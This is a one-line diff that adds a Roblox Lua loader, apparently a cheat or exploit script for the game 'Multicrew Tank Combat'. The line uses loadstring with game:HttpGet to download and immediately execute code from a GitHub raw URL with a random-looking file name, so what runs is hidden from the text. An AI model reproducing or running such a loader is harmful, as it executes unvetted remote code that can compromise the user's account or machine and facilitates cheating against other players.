@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/mtc-multicrew-tank-combat-spam7-szq0j5kaof2x0f.lua"))()
